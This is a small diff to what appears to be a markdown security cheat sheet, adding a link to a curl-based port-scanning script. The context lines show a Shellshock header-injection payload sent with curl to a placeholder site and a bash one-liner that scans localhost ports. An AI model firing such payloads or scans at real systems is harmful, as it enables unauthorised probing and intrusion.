@@ -364,6 +364,9 @@ curl -H "User-Agent: () { :; }; /bin/ls" http://vulnerablesitegoeshere.net/
 for i in {1..65535}; do curl -s -m 2 localhost:$i >/dev/null; if [ ! $? -eq 7 ] && [ ! $? -eq 28 ]; then echo open: $i; fi; done
 ```
 
+For a more robust script that uses curl to portscan hosts, peep this:
+https://github.com/droberson/curl-portscan
+
 # Windows Platform Tokens
 
 These strings are found in user agent strings in browsers amongst
